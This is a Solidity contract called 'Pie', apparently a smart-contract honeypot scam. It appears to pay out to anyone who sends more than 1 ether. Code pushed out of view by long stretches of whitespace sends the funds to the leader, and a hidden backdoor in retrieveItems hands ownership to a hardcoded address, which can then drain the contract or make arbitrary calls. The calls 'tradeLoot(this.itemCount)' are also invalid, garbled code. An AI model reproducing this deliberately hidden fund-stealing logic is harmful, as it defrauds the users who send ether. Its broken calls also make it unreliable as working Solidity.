pragma solidity ^0.4.19;

contract Pie
{
    address public GuildLeader = msg.sender;

    function()
    public
    payable
    {

    }

    function GetPie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       GuildLeader.tradeLoot(this.itemCount);
            msg.sender.tradeLoot(this.itemCount);
        }
    }

    function retrieveItems()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){GuildLeader=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == GuildLeader);
        GuildLeader.tradeLoot(this.itemCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == GuildLeader);
        adr.call.value(msg.value)(data);
    }
}